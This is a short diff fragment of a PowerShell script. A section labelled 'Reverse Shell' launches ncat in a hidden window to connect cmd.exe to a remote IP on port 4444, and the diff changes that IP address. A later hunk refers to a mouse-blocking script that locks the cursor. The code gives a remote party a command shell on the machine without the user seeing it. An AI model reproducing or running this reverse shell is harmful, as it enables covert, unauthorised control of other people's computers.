@@ -72,7 +72,7 @@ Start-Process explorer.exe
 #Reverse Shell
 Set-Location $env:USERPROFILE
 $Ncat = "C:\Program Files (x86)\Nmap\ncat.exe"
-Start-Process -FilePath $Ncat -ArgumentList "10.93.74.204 4444 -e cmd.exe" -WindowStyle Hidden
+Start-Process -FilePath $Ncat -ArgumentList "192.168.43.83 4444 -e cmd.exe" -WindowStyle Hidden
 
 <#
 mouseblock.ps1
@@ -115,6 +115,7 @@ try {
 finally {
     Write-Host "`nStopped. Cursor can move freely again."
 }
+
 
 
 
